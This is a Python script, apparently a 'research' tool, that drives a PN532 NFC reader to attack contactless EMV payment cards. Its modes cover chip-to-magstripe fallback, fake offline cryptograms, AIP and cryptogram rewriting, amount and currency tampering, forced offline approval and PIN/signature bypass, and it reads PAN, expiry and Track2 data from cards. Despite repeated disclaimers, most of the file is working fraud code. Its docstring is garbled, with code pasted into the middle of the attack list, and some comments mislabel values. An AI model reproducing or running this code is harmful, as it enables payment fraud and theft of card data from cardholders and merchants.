#!/usr/bin/env python3
"""
EMV Spoofing & Manipulation Terminal - Based on emv.html attack vectors

MALICIOUS EMV WORKFLOWS - EDUCATIONAL/RESEARCH ONLY:
6. Force MSD Fallback (Disable chip, force magnetic stripe)
7. Spoof Offline TC (Generate fake offline approval)
8. AIP Manipulation (Change card capabilities)
9. Bad Crypto Bypass (Invalid cryptogram acceptance)
10. Amount Manipulation (Change transaction amounts)
11. Currency Manipulation (Change currency codes)
12. Force Of    attack_info = EmvSpoofingTerminal(args.port, args.attack).get_attack_info()
    
    logger.info("=" * 80)
    logger.info("🏴‍☠️ EMV SPOOFING TERMINAL - RESEARCH MODE")
    logger.info("📡 Port: %s | Attack: %d", args.port, args.attack)
    logger.info("🎯 %s", attack_info['description'])
    logger.info("💀 Vector: %s", attack_info['attack_vector'])
    logger.info("=" * 80)e High Value (Bypass online limits)
13. CVM Bypass (Skip cardholder verification)

⚠️  WARNING: FOR SECURITY RESEARCH ONLY - DO NOT USE ON LIVE SYSTEMS
"""
import serial
import time
import logging
import argparse
from typing import Optional, List, Dict

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

class EmvSpoofingTerminal:
    """EMV Terminal with malicious/spoofing capabilities for security research"""
    
    def __init__(self, port: str, attack_mode: int = 6):
        self.port = port
        self.ser = None
        self.target_active = False
        self.attack_mode = attack_mode
        
        # MALICIOUS EMV ATTACK MODES based on emv.html analysis
        self.ATTACK_MODES = {
            6: {
                'name': 'Force MSD Fallback',
                'description': 'Disable chip processing, force magnetic stripe data only',
                'terminal_qualifiers': '27000000',  # Standard but chip disabled
                'amount': '000000002500',  # $25.00
                'force_msd': True,
                'expected_aip': '2000',  # MSD only
                'attack_vector': 'Bypass chip security by forcing MSD mode'
            },
            7: {
                'name': 'Spoof Offline TC',
                'description': 'Generate fake Transaction Certificate for offline approval',
                'terminal_qualifiers': '00000000',  # Force offline
                'amount': '000000050000',  # $500.00 (high value offline)
                'force_offline': True,
                'spoof_cryptogram': '4011203A0000',  # Fake TC
                'expected_aip': '6000',  # Offline capable
                'attack_vector': 'Generate fake offline approval without issuer auth'
            },
            8: {
                'name': 'AIP Manipulation',
                'description': 'Manipulate Application Interchange Profile capabilities',
                'terminal_qualifiers': '27000000',
                'amount': '000000010000',  # $100.00
                'manipulate_aip': True,
                'fake_aip': '7C00',  # Fake full EMV capabilities
                'preferred_aid': 'A0000000980840',  # Test with US Debit (0000 → 7C00)
                'attack_vector': 'Make basic debit card appear as full EMV chip'
            },
            9: {
                'name': 'Bad Crypto Bypass',
                'description': 'Accept invalid/bad cryptograms as valid',
                'terminal_qualifiers': '27000000',
                'amount': '000000075000',  # $750.00
                'accept_bad_crypto': True,
                'bad_cryptogram': '0000000000000000',  # Invalid crypto
                'attack_vector': 'Bypass cryptogram validation for fraudulent approval'
            },
            10: {
                'name': 'Amount Manipulation',
                'description': 'Present different amounts to card vs POS system',
                'terminal_qualifiers': '27000000',
                'display_amount': '000000000100',  # Show $1.00 to user
                'actual_amount': '000000100000',   # Send $1000.00 to card
                'attack_vector': 'User sees $1, card processes $1000'
            },
            11: {
                'name': 'Currency Manipulation', 
                'description': 'Change currency codes to exploit exchange rates',
                'terminal_qualifiers': '27000000',
                'amount': '000000005000',  # $50.00
                'real_currency': '0978',    # USD (840)
                'fake_currency': '0356',    # INR (356) - much lower value
                'attack_vector': 'Process USD amount as INR for lower cost'
            },
            12: {
                'name': 'Force Offline High Value',
                'description': 'Force high-value transactions offline to bypass limits',
                'terminal_qualifiers': '00000000',  # Force offline
                'amount': '000000500000',  # $5000.00 (should require online)
                'force_offline': True,
                'bypass_limits': True,
                'attack_vector': 'Process high amounts offline without issuer approval'
            },
            13: {
                'name': 'CVM Bypass',
                'description': 'Skip Cardholder Verification Method (PIN/signature)',
                'terminal_qualifiers': 'A0000000',  # No CVM required
                'amount': '000000010000',  # $100.00 (normally requires PIN)
                'skip_cvm': True,
                'attack_vector': 'Process transactions without PIN or signature'
            }
        }
    
    def get_attack_info(self) -> Dict:
        """Get current attack mode configuration"""
        return self.ATTACK_MODES.get(self.attack_mode, self.ATTACK_MODES[6])
    
    def connect(self) -> bool:
        """Connect to PN532"""
        try:
            self.ser = serial.Serial(self.port, 115200, timeout=0.25)
            logger.info("🏴‍☠️ EMV Spoofing Terminal connected to %s", self.port)
            return True
        except Exception as e:
            logger.error("Connection failed - %s", e)
            return False
    
    def send_raw_command(self, data: bytes) -> bytes:
        """Send raw command"""
        try:
            self.ser.write(data)
            time.sleep(0.04)
            response = self.ser.read(500)
            return response
        except Exception as e:
            logger.error("Command failed - %s", e)
            return b''
    
    def initialize_terminal(self) -> bool:
        """Initialize PN532 for EMV spoofing"""
        attack_info = self.get_attack_info()
        logger.info("💀 Initializing EMV spoofing for: %s", attack_info['name'])
        
        commands = [
            b'\x55' * 10,
            b'\x00\x00\xFF\x04\xFC\xD4\x14\x01\x17\x00',
            b'\x00\x00\xFF\x04\xFC\xD4\x32\x01\x01\x00\xE0\x00'
        ]
        
        for cmd in commands:
            self.send_raw_command(cmd)
        
        logger.info("🏴‍☠️ EMV spoofing terminal ready")
        return True
    
    def detect_card_emv(self) -> bool:
        """EMV card detection"""
        detect_cmd = b'\x00\x00\xFF\x04\xFC\xD4\x4A\x01\x00\xE1\x00'
        response = self.send_raw_command(detect_cmd)
        
        if len(response) > 15:
            logger.info("🎯 Target card detected")
            self.target_active = True
            return True
        
        return False
    
    def send_apdu_spoof(self, apdu_hex: str, description: str = "") -> Optional[str]:
        """Send APDU with spoofing capabilities"""
        if not self.target_active:
            return None
        
        try:
            apdu_bytes = bytes.fromhex(apdu_hex)
            data_len = len(apdu_bytes) + 3
            
            frame = bytearray([0x00, 0x00, 0xFF, data_len, (~data_len + 1) & 0xFF, 0xD4, 0x40, 0x01])
            frame.extend(apdu_bytes)
            
            checksum = sum(frame[5:])
            frame.extend([(~checksum + 1) & 0xFF, 0x00])
            
            logger.info("[ATTACK-TX] %s: %s", description, apdu_hex)
            
            response = self.send_raw_command(frame)
            
            if response:
                for i in range(min(50, len(response) - 7)):
                    if (response[i:i+3] == b'\x00\x00\xFF' and 
                        i+5 < len(response) and response[i+5] == 0xD5):
                        apdu_data = response[i+7:-2]
                        if apdu_data:
                            apdu_hex_resp = apdu_data.hex().upper()
                            
                            # Apply attack-specific response manipulation
                            original_resp = apdu_hex_resp
                            apdu_hex_resp = self.manipulate_response(apdu_hex_resp, description)
                            
                            logger.info("[ATTACK-RX] %s: %s", description, apdu_hex_resp)
                            
                            # Show manipulation if it occurred
                            if original_resp != apdu_hex_resp:
                                logger.warning("📝 MANIPULATION: %s → %s", 
                                             self.format_key_data(original_resp),
                                             self.format_key_data(apdu_hex_resp))
                            
                            return apdu_hex_resp
                        break
            
            return None
            
        except Exception as e:
            logger.error("Spoofing APDU failed - %s", e)
            return None
    
    def format_key_data(self, response: str) -> str:
        """Format key EMV data for educational display"""
        try:
            # Extract and format key EMV fields based on emv.html real data
            if '82022000' in response:
                return "AIP=2000(VISA-MSD)"
            elif '82020000' in response:
                return "AIP=0000(US-Debit-Basic)"
            elif '82027C00' in response:
                return "AIP=7C00(Full-EMV-Spoofed)"
            elif '82026000' in response:
                return "AIP=6000(Offline-Capable)"
            elif '9F2608' in response:
                crypto_start = response.find('9F2608') + 6
                crypto = response[crypto_start:crypto_start+16]
                return f"Cryptogram={crypto}"
            elif '57' in response:
                # Track2 data
                return "Track2-data"
            else:
                return "EMV-response"
        except Exception:
            return "EMV-data"
    
    def manipulate_response(self, response: str, command: str) -> str:
        """Apply attack-specific response manipulation"""
        attack_info = self.get_attack_info()
        original_response = response
        
        if 'GPO' in command and attack_info.get('manipulate_aip'):
            # AIP Manipulation - Change AIP in GPO response
            # Real AIPs from emv.html:
            # - VISA (A0000000031010): 82022000 (AIP=2000) 
            # - US Debit (A0000000980840): 82020000 (AIP=0000)
            
            if '82022000' in response:  # VISA MSD AIP
                fake_aip = attack_info.get('fake_aip', '7C00')
                response = response.replace('82022000', f'8202{fake_aip}')
                logger.warning("🚨 AIP MANIPULATION: Original=2000 (MSD) → Spoofed=%s (Full EMV)", fake_aip)
            elif '82020000' in response:  # US Debit AIP  
                fake_aip = attack_info.get('fake_aip', '7C00')
                response = response.replace('82020000', f'8202{fake_aip}')
                logger.warning("🚨 AIP MANIPULATION: Original=0000 (Basic) → Spoofed=%s (Full EMV)", fake_aip)
        
        if 'GPO' in command and attack_info.get('spoof_cryptogram'):
            # Cryptogram Spoofing - Insert fake cryptogram
            fake_crypto = attack_info.get('spoof_cryptogram')
            if '9F2608' in response:  # Found Application Cryptogram tag
                # Replace with spoofed cryptogram
                start = response.find('9F2608') + 6
                original_crypto = response[start:start+16]
                response = response[:start] + fake_crypto + response[start+16:]
                logger.warning("🚨 CRYPTOGRAM SPOOFED: Original=%s → Fake=%s", original_crypto, fake_crypto)
        
        return response
    
    def build_malicious_gpo(self) -> str:
        """Build GPO command with malicious PDOL data"""
        attack_info = self.get_attack_info()
        
        # Get amounts based on attack type
        if attack_info.get('display_amount') and attack_info.get('actual_amount'):
            # Amount manipulation attack
            logger.warning("🚨 AMOUNT MANIPULATION: Display $%.2f, Process $%.2f",
                         int(attack_info['display_amount']) / 100,
                         int(attack_info['actual_amount']) / 100)
            amount = attack_info['actual_amount']
        else:
            amount = attack_info.get('amount', '000000001000')
        
        # Get currency code
        currency = attack_info.get('fake_currency', '0978')  # Default USD
        if attack_info.get('real_currency') and attack_info.get('fake_currency'):
            logger.warning("🚨 CURRENCY MANIPULATION: %s → %s",
                         attack_info['real_currency'], currency)
        
        # Build PDOL with malicious parameters
        pdol_data = (
            attack_info['terminal_qualifiers'] +  # TTQ (may force offline/bypass)
            amount +                              # Amount (may be manipulated)
            '000000000000' +                      # Amount Other
            '0978' +                             # Terminal Country (US)
            '0000000000' +                       # TVR (Terminal Verification Results)
            currency +                           # Currency (may be spoofed)
            '230301' +                          # Transaction Date
            '00' +                              # Transaction Type
            '38393031'                          # Unpredictable Number
        )
        
        pdol_length = len(pdol_data) // 2
        gpo_command = f'80A8{pdol_length+2:04X}83{pdol_length:02X}{pdol_data}00'
        
        return gpo_command
    
    def execute_attack_workflow(self) -> bool:
        """Execute malicious EMV workflow"""
        start_time = time.time()
        attack_info = self.get_attack_info()
        
        logger.info("=" * 60)
        logger.info("🏴‍☠️ ATTACK MODE: %s", attack_info['name'])
        logger.info("🎯 VECTOR: %s", attack_info['attack_vector'])
        logger.info("⚠️  FOR SECURITY RESEARCH ONLY!")
        logger.info("=" * 60)
        
        # Phase 1: Target acquisition
        if not self.initialize_terminal():
            return False
        
        if not self.detect_card_emv():
            logger.error("💥 Target acquisition failed")
            return False
        
        # Phase 2: EMV Attack Sequence
        
        # SELECT PPSE (standard)
        ppse_resp = self.send_apdu_spoof(
            "00a404000e325041592e5359532e444446303100", 
            "SELECT PPSE"
        )
        if not ppse_resp or not ppse_resp.endswith('9000'):
            logger.error("💥 PPSE selection failed")
            return False
        
        # Parse AIDs
        aids = self.parse_ppse_aids(ppse_resp)
        if not aids:
            logger.error("💥 No AIDs found")
            return False
        
        # SELECT AID (may prefer specific AID for attack)
        selected_aid = aids[0]
        logger.info("🎯 Target AID: %s", selected_aid)
        
        aid_resp = self.send_apdu_spoof(
            f"00a4040007{selected_aid}00", 
            f"SELECT AID {selected_aid}"
        )
        if not aid_resp or not aid_resp.endswith('9000'):
            logger.error("💥 AID selection failed")
            return False
        
        # MALICIOUS GPO with attack-specific PDOL
        if attack_info.get('force_msd'):
            logger.warning("🚨 FORCING MSD FALLBACK - Disabling chip processing")
        
        if attack_info.get('force_offline'):
            logger.warning("🚨 FORCING OFFLINE PROCESSING - Bypassing online auth")
        
        if attack_info.get('bypass_limits'):
            logger.warning("🚨 BYPASSING TRANSACTION LIMITS - High value offline")
        
        gpo_command = self.build_malicious_gpo()
        gpo_resp = self.send_apdu_spoof(gpo_command, "MALICIOUS GPO")
        if not gpo_resp or not gpo_resp.endswith('9000'):
            logger.error("💥 Malicious GPO failed")
            return False
        
        # Analyze attack results with educational details
        aip = self.extract_aip(gpo_resp)
        cryptogram = self.extract_cryptogram(gpo_resp)
        track2 = self.extract_track2(gpo_resp)
        
        logger.info("📊 EMV ANALYSIS:")
        
        if aip:
            expected_aip = attack_info.get('expected_aip')
            logger.info("   AIP (Application Interchange Profile): %s", aip)
            if expected_aip:
                logger.info("   Expected AIP: %s", expected_aip)
            
            # Decode AIP meaning
            aip_meaning = self.decode_aip(aip)
            logger.info("   AIP Capabilities: %s", aip_meaning)
            
            if attack_info.get('manipulate_aip') and aip == attack_info.get('fake_aip'):
                logger.error("🚨 AIP MANIPULATION SUCCESSFUL: %s → %s", 
                           expected_aip, aip)
        
        if cryptogram:
            logger.info("   Application Cryptogram: %s", cryptogram)
            if attack_info.get('accept_bad_crypto'):
                logger.warning("🚨 ACCEPTING POTENTIALLY INVALID CRYPTOGRAM!")
        
        if track2:
            pan, expiry = self.parse_track2(track2)
            logger.info("   PAN: %s | Expiry: %s", pan, expiry)
            logger.info("   Track2 Data: %s", track2)
        
        # Skip READ RECORD for most attacks (speed optimization)
        if not attack_info.get('force_msd'):
            logger.info("🚀 Skipping READ RECORDs for attack speed")
        
        # Calculate attack time
        total_time = time.time() - start_time
        
        logger.info("=" * 60)
        logger.info("🏴‍☠️ ATTACK COMPLETED!")
        logger.info("⚡ Attack time: %.2f seconds", total_time)
        logger.info("🎯 Vector: %s", attack_info['attack_vector'])
        
        if total_time < 3.0:
            logger.info("🚀 FAST ATTACK ACHIEVED!")
        
        logger.info("=" * 60)
        
        return True
    
    def decode_aip(self, aip_hex: str) -> str:
        """Decode AIP capabilities for educational purposes"""
        try:
            aip_int = int(aip_hex, 16)
            capabilities = []
            
            if aip_int & 0x8000: capabilities.append("RFU")
            if aip_int & 0x4000: capabilities.append("SDA")  # Static Data Authentication
            if aip_int & 0x2000: capabilities.append("DDA")  # Dynamic Data Authentication
            if aip_int & 0x1000: capabilities.append("CHV")  # Cardholder Verification
            if aip_int & 0x0800: capabilities.append("TRM")  # Terminal Risk Management
            if aip_int & 0x0400: capabilities.append("IssAuth")  # Issuer Authentication
            if aip_int & 0x0200: capabilities.append("CDA")  # Combined DDA/AC
            if aip_int & 0x0100: capabilities.append("MSD")  # Magnetic Stripe Data
            
            return ", ".join(capabilities) if capabilities else "No capabilities"
        except Exception:
            return "Unknown"
    
    def parse_ppse_aids(self, ppse_hex: str) -> List[str]:
        """Extract AIDs from PPSE response"""
        try:
            ppse_bytes = bytes.fromhex(ppse_hex[:-4])
            aids = []
            
            i = 0
            while i < len(ppse_bytes) - 2:
                if ppse_bytes[i] == 0x4F:
                    aid_len = ppse_bytes[i + 1]
                    if i + 2 + aid_len <= len(ppse_bytes):
                        aid = ppse_bytes[i + 2:i + 2 + aid_len].hex().upper()
                        aids.append(aid)
                        i += 2 + aid_len
                    else:
                        break
                else:
                    i += 1
            
            return aids
        except Exception:
            return []
    
    def extract_aip(self, gpo_response: str) -> Optional[str]:
        """Extract AIP from GPO response"""
        try:
            data = bytes.fromhex(gpo_response[:-4])
            for i in range(len(data) - 3):
                if data[i] == 0x82 and data[i+1] == 0x02:
                    return data[i+2:i+4].hex().upper()
            return None
        except Exception:
            return None
    
    def extract_cryptogram(self, gpo_response: str) -> Optional[str]:
        """Extract Application Cryptogram from GPO response"""
        try:
            data = bytes.fromhex(gpo_response[:-4])
            for i in range(len(data) - 2):
                if data[i] == 0x9F and data[i+1] == 0x26:
                    crypto_len = data[i+2]
                    if i + 3 + crypto_len <= len(data):
                        return data[i+3:i+3+crypto_len].hex().upper()
            return None
        except Exception:
            return None
    
    def extract_track2(self, gpo_response: str) -> Optional[str]:
        """Extract Track2 from GPO response"""
        try:
            data = bytes.fromhex(gpo_response[:-4])
            for i in range(len(data) - 2):
                if data[i] == 0x57:
                    track2_len = data[i+1]
                    if i + 2 + track2_len <= len(data):
                        return data[i+2:i+2+track2_len].hex().upper()
            return None
        except Exception:
            return None
    
    def parse_track2(self, track2_hex: str) -> tuple:
        """Parse PAN and expiry from Track2 data"""
        try:
            sep_pos = track2_hex.find('D')
            if sep_pos > 0:
                pan = track2_hex[:sep_pos]
                expiry = track2_hex[sep_pos+1:sep_pos+5]
                return pan, expiry
            return "", ""
        except Exception:
            return "", ""
    
    def disconnect(self):
        """Clean disconnect"""
        if self.ser and self.ser.is_open:
            self.ser.close()
            logger.info("🏴‍☠️ EMV spoofing terminal disconnected")

def main():
    parser = argparse.ArgumentParser(description='EMV Spoofing Terminal - FOR SECURITY RESEARCH ONLY')
    parser.add_argument('--port', default='/dev/rfcomm1', help='Serial port (default: /dev/rfcomm1)')
    parser.add_argument('--attack', type=int, default=6, choices=range(6,14), 
                       help='Attack mode: 6=Force MSD, 7=Spoof TC, 8=AIP Manip, 9=Bad Crypto, 10=Amount Manip, 11=Currency Manip, 12=Force Offline, 13=CVM Bypass')
    parser.add_argument('--list-attacks', action='store_true', help='List available attack modes')
    
    args = parser.parse_args()
    
    if args.list_attacks:
        terminal = EmvSpoofingTerminal(args.port, 6)
        print("⚠️  EMV ATTACK MODES - FOR SECURITY RESEARCH ONLY!")
        print("=" * 80)
        for aid, attack in terminal.ATTACK_MODES.items():
            print(f"{aid}. {attack['name']}")
            print(f"   🎯 {attack['description']}")
            print(f"   💀 Vector: {attack['attack_vector']}")
            if attack.get('display_amount'):
                print(f"   💰 Amount Manipulation: ${int(attack['display_amount'])/100:.2f} → ${int(attack['actual_amount'])/100:.2f}")
            else:
                print(f"   💰 Amount: ${int(attack.get('amount', '0'))/100:.2f}")
            print()
        return
    
    print("⚠️  WARNING: EMV SPOOFING TERMINAL")
    print("⚠️  FOR SECURITY RESEARCH AND EDUCATION ONLY!")
    print("⚠️  DO NOT USE ON LIVE PAYMENT SYSTEMS!")
    print()
    
    attack_info = EmvSpoofingTerminal(args.port, args.attack).get_attack_info()
    
    logger.info("=" * 80)
    logger.info("🏴‍☠️ EMV SPOOFING TERMINAL - RESEARCH MODE")
    logger.info("📡 Port: %s | Attack: %d", args.port, args.attack)
    logger.info("🎯 %s", attack_info['description'])
    logger.info("💀 Vector: %s", attack_info['attack_vector'])
    logger.info("=" * 80)
    
    terminal = EmvSpoofingTerminal(args.port, args.attack)
    
    try:
        if not terminal.connect():
            return False
        
        logger.info("🎯 PLACE TARGET EMV CARD ON PN532 READER...")
        
        success = terminal.execute_attack_workflow()
        
        logger.info("=" * 60)
        if success:
            logger.info("🏴‍☠️ ATTACK SEQUENCE COMPLETED!")
        else:
            logger.error("💥 ATTACK SEQUENCE FAILED!")
        logger.info("=" * 60)
        
        return success
        
    except KeyboardInterrupt:
        logger.info("💀 Attack interrupted by user")
        return False
    finally:
        terminal.disconnect()

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)